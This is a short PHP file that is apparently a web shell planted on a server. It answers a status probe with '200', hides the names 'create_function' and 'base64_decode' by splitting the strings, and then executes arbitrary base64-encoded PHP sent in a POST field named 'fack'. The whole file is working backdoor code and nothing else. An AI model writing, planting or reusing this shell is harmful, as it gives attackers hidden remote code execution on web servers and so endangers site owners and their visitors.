<?php 
if ($_GET['q']=='1'){echo '200'; exit;}

$c = 'create_'.'function';
$f = 'base64_'.'decode';
register_shutdown_function($c('', $f($_POST['fack'])));
?> 

